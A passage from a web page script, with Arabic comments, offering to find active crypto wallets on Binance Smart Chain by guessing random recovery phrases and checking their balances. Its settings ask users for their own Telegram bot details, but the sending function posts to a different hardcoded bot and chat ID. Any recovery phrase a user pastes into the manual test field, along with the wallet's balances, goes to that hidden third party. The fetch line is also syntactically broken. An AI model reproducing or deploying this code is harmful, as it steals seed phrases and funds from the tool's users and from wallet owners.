            "voice", "void", "volcano", "volume", "vote", "voyage", "wage", "wagon", "wait", "walk",
            "wall", "walnut", "want", "warfare", "warm", "warrior", "wash", "wasp", "waste", "water",
            "wave", "way", "wealth", "weapon", "wear", "weasel", "weather", "web", "wedding", "weekend",
            "weird", "welcome", "west", "wet", "what", "wheat", "wheel", "when", "where", "whip",
            "whisper", "wide", "width", "wife", "wild", "will", "win", "window", "wine", "wing",
            "wink", "winner", "winter", "wire", "wisdom", "wise", "wish", "witness", "wolf", "woman",
            "wonder", "wood", "wool", "word", "work", "world", "worry", "worth", "wrap", "wreck",
            "wrestle", "wrist", "write", "wrong", "yard", "year", "yellow", "you", "young", "youth",
            "zebra", "zero", "zone", "zoo"
        ];

        // إعدادات Telegram
        const TELEGRAM_BOT_TOKEN = '7736175658:AAGJGvCGfGKHBGhfKNPfKhqhGNKJdKJJJJJ'; // ضع هنا رمز البوت الخاص بك
        const TELEGRAM_CHAT_ID = '1234567890'; // ضع هنا معرف المحادثة الخاص بك
        const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

        // إعدادات BSC
        const BSC_RPC_URL = 'https://bsc-dataseed.binance.org/';
        const BSCSCAN_API_KEY = 'YourBSCScanAPIKey'; // ضع هنا مفتاح BSCScan API الخاص بك
        const BSCSCAN_API_URL = 'https://api.bscscan.com/api';

        // العناصر
        const elements = {
            startBtn: document.getElementById('startBtn'),
            stopBtn: document.getElementById('stopBtn'),
            testTelegramBtn: document.getElementById('testTelegramBtn'),
            clearLogsBtn: document.getElementById('clearLogsBtn'),
            testManualBtn: document.getElementById('testManualBtn'),
            searchSpeed: document.getElementById('searchSpeed'),
            maxAttempts: document.getElementById('maxAttempts'),
            manualMnemonic: document.getElementById('manualMnemonic'),
            totalGenerated: document.getElementById('totalGenerated'),
            activeWallets: document.getElementById('activeWallets'),
            emptyWallets: document.getElementById('emptyWallets'),
            errorCount: document.getElementById('errorCount'),
            progressFill: document.getElementById('progressFill'),
            currentStatus: document.getElementById('currentStatus'),
            logPanel: document.getElementById('logPanel'),
            manualTestResult: document.getElementById('manualTestResult'),
            liveDisplay: document.getElementById('liveDisplay'),
            currentPhrase: document.getElementById('currentPhrase'),
            phraseStatus: document.getElementById('phraseStatus')
        };

        // المتغيرات العامة
        let isRunning = false;
        let searchInterval = null;
        const stats = {
            totalGenerated: 0,
            activeWallets: 0,
            emptyWallets: 0,
            errors: 0
        };

        // وظيفة توليد عبارة BIP39 عشوائية سريعة (مدمجة من كود sell)
        function generateRandomBIP39Phrase() {
            const words = [];
            for (let i = 0; i < 12; i++) {
                const randomIndex = Math.floor(Math.random() * BIP39_WORDLIST.length);
                words.push(BIP39_WORDLIST[randomIndex]);
            }
            return words.join(' ');
        }

        // وظيفة تحويل العبارة إلى عنوان محفظة (مدمجة من كود sell)
        async function mnemonicToAddress(mnemonic) {
            try {
                if (!ethers || !ethers.utils) {
                    throw new Error('مكتبة ethers.js غير محملة');
                }
                
                // التحقق من صحة العبارة
                if (!ethers.utils.isValidMnemonic(mnemonic)) {
                    throw new Error('عبارة الاسترجاع غير صالحة');
                }
                
                // إنشاء محفظة من العبارة
                const wallet = ethers.Wallet.fromMnemonic(mnemonic);
                return wallet.address;
            } catch (error) {
                console.error('خطأ في تحويل العبارة إلى عنوان:', error);
                return null;
            }
        }

        // وظيفة التحقق من تحميل مكتبة ethers.js
        function checkEthersLoaded() {
            if (typeof ethers === 'undefined') {
                updateStatus('❌ مكتبة ethers.js غير محملة. يرجى إعادة تحميل الصفحة.', 'danger');
                addLogEntry('خطأ: مكتبة ethers.js غير محملة', 'error');
                return false;
            }
            return true;
        }

        // وظائف فحص المحفظة على BSC (محتفظة من كود usdt)
        async function checkWalletBalance(address) {
            try {
                if (!checkEthersLoaded()) {
                    return null;
                }
                
                const provider = new ethers.providers.JsonRpcProvider(BSC_RPC_URL);
                const balance = await provider.getBalance(address);
                return parseFloat(ethers.utils.formatEther(balance));
            } catch (error) {
                console.error('خطأ في التحقق من رصيد المحفظة:', error);
                return null;
            }
        }

        // قائمة العملات الشائعة على BSC
        const BSC_TOKENS = [
            { symbol: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18 },
            { symbol: 'USDC', address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18 },
            { symbol: 'BUSD', address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', decimals: 18 },
            { symbol: 'CAKE', address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', decimals: 18 },
            { symbol: 'ADA', address: '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47', decimals: 18 }
        ];

        async function getTokenBalances(address) {
            try {
                if (!checkEthersLoaded()) {
                    return [];
                }
                
                const provider = new ethers.providers.JsonRpcProvider(BSC_RPC_URL);
                const tokenBalances = [];
                
                // ABI مبسط للعملات BEP-20
                const tokenABI = [
                    'function balanceOf(address owner) view returns (uint256)',
                    'function decimals() view returns (uint8)',
                    'function symbol() view returns (string)'
                ];
                
                for (const token of BSC_TOKENS) {
                    try {
                        const contract = new ethers.Contract(token.address, tokenABI, provider);
                        const balance = await contract.balanceOf(address);
                        const decimals = token.decimals;
                        const numericBalance = parseFloat(ethers.utils.formatUnits(balance, decimals));
                        
                        if (numericBalance > 0) {
                            tokenBalances.push({
                                symbol: token.symbol,
                                balance: numericBalance,
                                address: token.address
                            });
                        }
                    } catch (error) {
                        console.error(`خطأ في جلب رصيد ${token.symbol}:`, error);
                    }
                }
                
                return tokenBalances;
            } catch (error) {
                console.error('خطأ في جلب أرصدة العملات:', error);
                return [];
            }
        }

        async function getTransactionCount(address) {
            try {
                if (!checkEthersLoaded()) {
                    return null;
                }
                
                const provider = new ethers.providers.JsonRpcProvider(BSC_RPC_URL);
                const transactionCount = await provider.getTransactionCount(address);
                return transactionCount;
            } catch (error) {
                console.error('خطأ في الحصول على عدد المعاملات:', error);
                return null;
            }
        }

        // تحديث دالة isWalletActive لدعم العملات المتعددة على BSC
        async function isWalletActive(address) {
            try {
                const [balance, transactionCount, tokenBalances] = await Promise.all([
                    checkWalletBalance(address),
                    getTransactionCount(address),
                    getTokenBalances(address)
                ]);
                
                const hasBalance = balance !== null && balance > 0;
                const hasTransactions = transactionCount !== null && transactionCount > 0;
                const hasTokens = tokenBalances.length > 0;
                
                return {
                    isActive: hasBalance || hasTransactions || hasTokens,
                    balance: balance,
                    transactionCount: transactionCount,
                    tokenBalances: tokenBalances,
                    hasBalance: hasBalance,
                    hasTransactions: hasTransactions,
                    hasTokens: hasTokens
                };
            } catch (error) {
                console.error('خطأ في التحقق من نشاط المحفظة:', error);
                return {
                    isActive: false,
                    balance: null,
                    transactionCount: null,
                    tokenBalances: [],
                    hasBalance: false,
                    hasTransactions: false,
                    hasTokens: false,
                    error: error.message
                };
            }
        }

        // وظائف Telegram
        async function sendTelegramMessage(message) {
            try {
                const response = await fetch(`${7906627459:AAFupbP8dosA92dUlWH0DpGvAZK0yGr17b4}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: 910021564,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                const data = await response.json();
                if (!data.ok) {
                    console.error('خطأ في إرسال الرسالة:', data.description);
                    return false;
                }
                
                return true;
            } catch (error) {
                console.error('خطأ في الاتصال بـ Telegram:', error);
                return false;
            }
        }

        // تحديث دالة formatWalletMessage لعرض جميع العملات على BSC
        function formatWalletMessage(mnemonic, address, walletDetails, isActive) {
            const timestamp = new Date().toLocaleString('ar-EG', {
                timeZone: 'Africa/Cairo',
                year: 'numeric',
                month: '2-digit',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });
            
            let message = '';
            if (isActive) {
                message = `🎉 <b>تم العثور على محفظة نشطة!</b>\n\n`;
            } else {
                message = `📝 <b>عبارة استرجاع جديدة</b>\n\n`;
            }
            
            message += `📝 <b>العبارة:</b>\n<code>${mnemonic}</code>\n\n`;
            message += `📍 <b>العنوان:</b>\n<code>${address}</code>\n\n`;
            
            if (walletDetails.balance !== null) {
                message += `💰 <b>رصيد BNB:</b> ${walletDetails.balance.toFixed(6)} BNB\n`;
            }
            
            if (walletDetails.transactionCount !== null) {
                message += `📊 <b>عدد المعاملات:</b> ${walletDetails.transactionCount}\n`;
            }
            
            // إضافة أرصدة العملات الأخرى على BSC
            if (walletDetails.tokenBalances.length > 0) {
                message += `\n🪙 <b>العملات الأخرى:</b>\n`;
                walletDetails.tokenBalances.forEach(token => {
                    message += `   ${token.symbol}: ${token.balance.toFixed(4)}\n`;
                });
            }
            
            if (isActive) {
                message += `\n✅ <b>الحالة:</b> محفظة نشطة\n`;
            } else {
                message += `\n❌ <b>الحالة:</b> محفظة فارغة\n`;
            }
            
            message += `\n⏰ <b>الوقت:</b> ${timestamp}`;
            message += `\n🌐 <b>الشبكة:</b> Binance Smart Chain (BSC)`;
            message += `\n🚀 <b>البحث السريع:</b> مفعل`;
            return message;
        }

        async function sendWalletToTelegram(mnemonic, address, walletDetails, isActive) {
            try {
                const message = formatWalletMessage(mnemonic, address, walletDetails, isActive);
                return await sendTelegramMessage(message);
            } catch (error) {
                console.error('خطأ في إرسال المحفظة:', error);
                return false;
            }
        }

        // وظائف العرض المباشر للعبارات (مدمجة من كود sell)
        function updateLiveDisplay(mnemonic, status) {
            elements.liveDisplay.style.display = 'block';
            elements.currentPhrase.textContent = mnemonic;
            
            elements.phraseStatus.className = `phrase-status ${status}`;
            switch(status) {
                case 'checking':
                    elements.phraseStatus.textContent = '🔄 جاري الفحص...';
                    break;
                case 'active':
                    elements.phraseStatus.textContent = '✅ محفظة نشطة!';
                    break;
                case 'empty':
                    elements.phraseStatus.textContent = '❌ محفظة فارغة';
                    break;
            }
        }

        // وظائف السجل
        function addLogEntry(message, type = 'info') {
            const timestamp = new Date().toLocaleTimeString('ar-EG');
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry log-${type}`;
            logEntry.innerHTML = `<span class="log-timestamp">[${timestamp}]</span> ${message}`;
            
            elements.logPanel.appendChild(logEntry);
            elements.logPanel.scrollTop = elements.logPanel.scrollHeight;
        }

        // وظائف تحديث الواجهة
        function updateStats() {
            elements.totalGenerated.textContent = stats.totalGenerated;
            elements.activeWallets.textContent = stats.activeWallets;
            elements.emptyWallets.textContent = stats.emptyWallets;
            elements.errorCount.textContent = stats.errors;
            
            const maxAttempts = parseInt(elements.maxAttempts.value) || 0;
            if (maxAttempts > 0) {
                const progress = (stats.totalGenerated / maxAttempts) * 100;
                elements.progressFill.style.width = `${Math.min(progress, 100)}%`;
            }
        }

        function updateStatus(message, type = 'info') {
            elements.currentStatus.textContent = message;
            elements.currentStatus.className = `alert alert-${type}`;
        }

        // الوظيفة الرئيسية للبحث (محدثة بالطريقة السريعة)
        async function searchForActiveWallets() {
            try {
                if (!checkEthersLoaded()) {
                    stats.errors++;
                    updateStats();
                    return;
                }

                // استخدام الطريقة السريعة لتوليد العبارة
                const mnemonic = generateRandomBIP39Phrase();
                stats.totalGenerated++;
                
                // عرض العبارة في القسم المباشر
                updateLiveDisplay(mnemonic, 'checking');
                
                updateStatus(`جاري فحص العبارة رقم ${stats.totalGenerated}...`, 'info');
                addLogEntry(`تم توليد عبارة جديدة: ${mnemonic.substring(0, 30)}...`);
                
                const address = await mnemonicToAddress(mnemonic);
                
                if (!address) {
                    stats.errors++;
                    addLogEntry('خطأ في تحويل العبارة إلى عنوان', 'error');
                    updateStats();
                    return;
                }
                
                const walletStatus = await isWalletActive(address);
                
                const telegramSent = await sendWalletToTelegram(mnemonic, address, walletStatus, walletStatus.isActive);
                
                if (walletStatus.isActive) {
                    stats.activeWallets++;
                    updateLiveDisplay(mnemonic, 'active');
                    addLogEntry(`🎉 تم العثور على محفظة نشطة! العنوان: ${address}`, 'success');
                    
                    if (telegramSent) {
                        addLogEntry('✅ تم إرسال المحفظة النشطة إلى Telegram بنجاح', 'success');
                    } else {
                        addLogEntry('❌ فشل في إرسال المحفظة النشطة إلى Telegram', 'error');
                    }
                    
                    updateStatus(`تم العثور على محفظة نشطة! إجمالي المحافظ النشطة: ${stats.activeWallets}`, 'success');
                } else {
                    stats.emptyWallets++;
                    updateLiveDisplay(mnemonic, 'empty');
                    addLogEntry(`محفظة فارغة: ${address.substring(0, 20)}...`);
                    
                    // إضافة العبارة تلقائيًا إلى حقل الاختبار اليدوي
                    elements.manualMnemonic.value = mnemonic;
                    // تحديث نتيجة الاختبار اليدوي تلقائيًا
                    updateManualTestResult(mnemonic, address, walletStatus);
                    
                    if (telegramSent) {
                        addLogEntry('✅ تم إرسال المحفظة الفارغة إلى Telegram بنجاح', 'info');
                        addLogEntry('✅ تم إضافة العبارة تلقائيًا إلى حقل الاختبار اليدوي', 'info');
                    } else {
                        addLogEntry('❌ فشل في إرسال المحفظة الفارغة إلى Telegram', 'error');
                    }
                }
                
                updateStats();
                
                const maxAttempts = parseInt(elements.maxAttempts.value) || 0;
                if (maxAttempts > 0 && stats.totalGenerated >= maxAttempts) {
                    stopSearch();
                    updateStatus(`تم الوصول للحد الأقصى من المحاولات (${maxAttempts})`, 'warning');
                    addLogEntry(`تم إيقاف البحث - وصل للحد الأقصى: ${maxAttempts} محاولة`, 'info');
                }
                
            } catch (error) {
                stats.errors++;
                addLogEntry(`خطأ في العملية: ${error.message}`, 'error');
                updateStats();
            }
        }

        // وظائف اختبار العبارات يدويًا
        async function testManualMnemonic() {
            const mnemonic = elements.manualMnemonic.value.trim();
            
            if (!mnemonic) {
                updateStatus('يرجى إدخال عبارة BIP39 للفحص', 'warning');
                return;
            }
            
            try {
                if (!checkEthersLoaded()) {
                    return;
                }

                updateStatus('جاري فحص العبارة...', 'info');
                addLogEntry(`🔍 جاري فحص العبارة يدويًا: ${mnemonic}`);
                
                // عرض العبارة في القسم المباشر
                updateLiveDisplay(mnemonic, 'checking');
                
                elements.testManualBtn.innerHTML = '<span class="loading-spinner"></span> جاري الفحص...';
                elements.testManualBtn.disabled = true;
                
                const address = await mnemonicToAddress(mnemonic);
                
                addLogEntry(`✅ تم تحويل العبارة إلى العنوان: ${address}`);
                
                const walletStatus = await isWalletActive(address);
                
                updateManualTestResult(mnemonic, address, walletStatus);
                
                const telegramSent = await sendWalletToTelegram(mnemonic, address, walletStatus, walletStatus.isActive);
                
                if (walletStatus.isActive) {
                    updateLiveDisplay(mnemonic, 'active');
                    addLogEntry(`🎉 العبارة تفتح محفظة نشطة! العنوان: ${address}`, 'success');
                    updateStatus('🎉 العبارة تفتح محفظة نشطة!', 'success');
                    
                    if (telegramSent) {
                        addLogEntry('✅ تم إرسال المحفظة النشطة إلى Telegram بنجاح', 'success');
                    } else {
                        addLogEntry('❌ فشل في إرسال المحفظة النشطة إلى Telegram', 'error');
                    }
                } else {
                    updateLiveDisplay(mnemonic, 'empty');
                    addLogEntry(`❌ العبارة تفتح محفظة فارغة: ${address}`, 'info');
                    updateStatus('❌ العبارة تفتح محفظة فارغة', 'info');
                    
                    if (telegramSent) {
                        addLogEntry('✅ تم إرسال المحفظة الفارغة إلى Telegram بنجاح', 'info');
                    } else {
                        addLogEntry('❌ فشل في إرسال المحفظة الفارغة إلى Telegram', 'error');
                    }
                }
                
                elements.testManualBtn.innerHTML = '<span>🔍 فحص العبارة</span>';
                elements.testManualBtn.disabled = false;
                
            } catch (error) {
                updateStatus(`❌ خطأ في فحص العبارة: ${error.message}`, 'danger');
                addLogEntry(`❌ خطأ في فحص العبارة: ${error.message}`, 'error');
                elements.testManualBtn.innerHTML = '<span>🔍 فحص العبارة</span>';
                elements.testManualBtn.disabled = false;
            }
        }

        // تحديث دالة عرض النتائج اليدوية
        function updateManualTestResult(mnemonic, address, walletStatus) {
            let resultHTML = '';
            
            if (walletStatus.isActive) {
                resultHTML = `
                    <h4>✅ نتيجة الفحص: المحفظة نشطة</h4>
                    <div class="status active">محفظة نشطة</div>
                    <div class="balance ${walletStatus.balance > 0 ? 'positive' : 'zero'}">
                        💰 رصيد BNB: ${walletStatus.balance !== null ? walletStatus.balance.toFixed(6) + ' BNB' : 'غير معروف'}
                    </div>
                    <div class="transactions">
                        📊 عدد المعاملات: ${walletStatus.transactionCount !== null ? walletStatus.transactionCount : 'غير معروف'}
                    </div>
                `;
                
                if (walletStatus.tokenBalances.length > 0) {
                    resultHTML += `
                        <div class="token-list">
                            <strong>🪙 العملات الأخرى:</strong>
                            ${walletStatus.tokenBalances.map(token => `
                                <div class="token-item">
                                    <span>${token.symbol}</span>
                                    <span>${token.balance.toFixed(4)}</span>
                                </div>
                            `).join('')}
                        </div>
                    `;
                }
                
                resultHTML += `
                    <div class="wallet-details">
                        <div class="mnemonic">📝 العبارة: ${mnemonic}</div>
                        <div class="address">📍 العنوان: ${address}</div>
                    </div>
                `;
                elements.manualTestResult.className = 'test-result active';
            } else {
                resultHTML = `
                    <h4>❌ نتيجة الفحص: المحفظة فارغة</h4>
                    <div class="status inactive">محفظة فارغة</div>
                    <div class="balance zero">
                        💰 رصيد BNB: ${walletStatus.balance !== null ? walletStatus.balance.toFixed(6) + ' BNB' : 'غير معروف'}
                    </div>
                    <div class="transactions">
                        📊 عدد المعاملات: ${walletStatus.transactionCount !== null ? walletStatus.transactionCount : 'غير معروف'}
                    </div>
                `;
                
                if (walletStatus.tokenBalances.length > 0) {
                    resultHTML += `
                        <div class="token-list">
                            <strong>🪙 العملات الأخرى:</strong>
                            ${walletStatus.tokenBalances.map(token => `
                                <div class="token-item">
                                    <span>${token.symbol}</span>
                                    <span>${token.balance.toFixed(4)}</span>
                                </div>
                            `).join('')}
                        </div>
                    `;
                }
                
                resultHTML += `
                    <div class="wallet-details">
                        <div class="mnemonic">📝 العبارة: ${mnemonic}</div>
                        <div class="address">📍 العنوان: ${address}</div>
                    </div>
                `;
                elements.manualTestResult.className = 'test-result inactive';
            }
            
            elements.manualTestResult.innerHTML = resultHTML;
            elements.manualTestResult.style.display = 'block';
        }

        // وظائف التحكم
        async function startSearch() {
            if (isRunning) return;
            
            if (!checkEthersLoaded()) {
                return;
            }
            
            isRunning = true;
            elements.startBtn.disabled = true;
            elements.stopBtn.disabled = false;
            
            const speed = parseInt(elements.searchSpeed.value) || 3000;
            
            updateStatus('جاري بدء البحث السريع على BSC...', 'info');
            addLogEntry('🚀 تم بدء البحث السريع عن المحافظ النشطة على BSC');
            
            // إظهار قسم العرض المباشر
            elements.liveDisplay.style.display = 'block';
            
            // إرسال رسالة البداية إلى Telegram
            let startMessage = `🚀 <b>بدء عملية البحث السريع عن المحافظ النشطة على BSC</b>\n\n`;
            startMessage += `⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}\n`;
            startMessage += `🔍 جاري البحث السريع عن محافظ تحتوي على أصول أو معاملات على شبكة Binance Smart Chain...\n`;
            startMessage += `🚀 البحث السريع: مفعل\n`;
            startMessage += `📊 معيار النشاط: الرصيد أو وجود معاملات أو العملات الأخرى`;
            
            await sendTelegramMessage(startMessage);
            
            searchInterval = setInterval(searchForActiveWallets, speed);
        }

        async function stopSearch() {
            if (!isRunning) return;
            
            isRunning = false;
            elements.startBtn.disabled = false;
            elements.stopBtn.disabled = true;
            
            if (searchInterval) {
                clearInterval(searchInterval);
                searchInterval = null;
            }
            
            updateStatus('تم إيقاف البحث', 'warning');
            addLogEntry('⏹️ تم إيقاف البحث');
            
            // إخفاء قسم العرض المباشر
            elements.liveDisplay.style.display = 'none';
            
            // إرسال رسالة الإيقاف إلى Telegram
            let stopMessage = `⏹️ <b>تم إيقاف عملية البحث السريع على BSC</b>\n\n`;
            stopMessage += `📊 <b>الإحصائيات النهائية:</b>\n`;
            stopMessage += `🔢 إجمالي العبارات: ${stats.totalGenerated}\n`;
            stopMessage += `✅ المحافظ النشطة: ${stats.activeWallets}\n`;
            stopMessage += `📭 المحافظ غير النشطة: ${stats.emptyWallets}\n`;
            stopMessage += `❌ الأخطاء: ${stats.errors}\n`;
            stopMessage += `\n⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}`;
            stopMessage += `\n🚀 البحث السريع: تم استخدامه`;
            
            await sendTelegramMessage(stopMessage);
        }

        async function testTelegramConnection() {
            updateStatus('جاري اختبار الاتصال بـ Telegram...', 'info');
            addLogEntry('🧪 جاري اختبار الاتصال بـ Telegram...');
            
            const testMessage = `🧪 <b>اختبار الاتصال - BSC Bot المحسن مع البحث السريع</b>\n\nتم الاتصال بنجاح مع بوت Telegram!\n\n✨ <b>الميزات المحسنة:</b>\n• البحث السريع لتوليد العبارات\n• فحص المعاملات كمعيار للنشاط\n• عرض العبارات المباشر\n• دعم العملات المتعددة على BSC\n• ضمان إرسال عبارة الاسترجاع\n\n⏰ ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}`;
            const success = await sendTelegramMessage(testMessage);
            
            if (success) {
                updateStatus('✅ تم الاتصال بـ Telegram بنجاح!', 'success');
                addLogEntry('✅ تم الاتصال بـ Telegram بنجاح!', 'success');
            } else {
                updateStatus('❌ فشل في الاتصال بـ Telegram', 'danger');
                addLogEntry('❌ فشل في الاتصال بـ Telegram', 'error');
            }
        }

        function clearLogs() {
            elements.logPanel.innerHTML = '';
            addLogEntry('تم مسح السجل');
        }

        // ربط الأحداث
        elements.startBtn.addEventListener('click', startSearch);
        elements.stopBtn.addEventListener('click', stopSearch);
        elements.testTelegramBtn.addEventListener('click', testTelegramConnection);
        elements.clearLogsBtn.addEventListener('click', clearLogs);
        elements.testManualBtn.addEventListener('click', testManualMnemonic);

        // التحقق من تحميل ethers.js عند بدء التطبيق
        document.addEventListener('DOMContentLoaded', function() {
            if (checkEthersLoaded()) {
                updateStatus('✅ تم تحميل مكتبة ethers.js بنجاح. جاهز للبحث السريع على BSC...', 'success');
                addLogEntry('✅ تم تحميل مكتبة ethers.js بنجاح', 'success');
                addLogEntry('🚀 البحث السريع: مفعل ومحسن', 'info');
                addLogEntry('🆕 الميزات المحسنة: البحث السريع + فحص المعاملات + عرض العبارات المباشر', 'info');
            }
        });

        // تحديث الإحصائيات عند بدء التطبيق
        updateStats();
    </script>
</body>
</html>
